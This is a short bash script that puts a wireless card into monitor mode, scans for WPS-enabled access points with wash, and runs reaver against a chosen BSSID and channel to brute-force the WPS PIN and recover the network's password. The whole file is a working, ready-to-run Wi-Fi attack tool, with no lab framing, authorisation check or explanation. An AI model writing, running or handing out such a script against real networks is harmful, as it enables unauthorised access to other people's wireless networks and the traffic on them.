#!/bin/bash

mode=$(iwconfig "${INTERFACE}" | grep -o "Mode:Managed")
if [ "${mode}" = "Mode:Managed" ]; then
		sudo ifconfig ${INTERFACE} down
		sudo iwconfig ${INTERFACE} mode monitor
		sudo ifconfig ${INTERFACE} up
fi

read -p "use 5ghz? (y/n): " ghz
echo -e "Press ctrl+c to stop the scan\n"

if [ "$ghz" = "n" ]; then
		sudo wash -i "$INTERFACE" -2
else
		sudo wash -i "$INTERFACE" -5
fi

read -p "bssid?: " bssid
read -p "channel?: " channel

if [ "$ghz" = "n" ]; then
		sudo reaver -i "$INTERFACE" -b "$bssid" -c "$channel" -vv
elif [ "$ghz" = "y" ]; then
		sudo reaver -i "$INTERFACE" -b "$bssid" -c "$channel" -5 -vv
fi
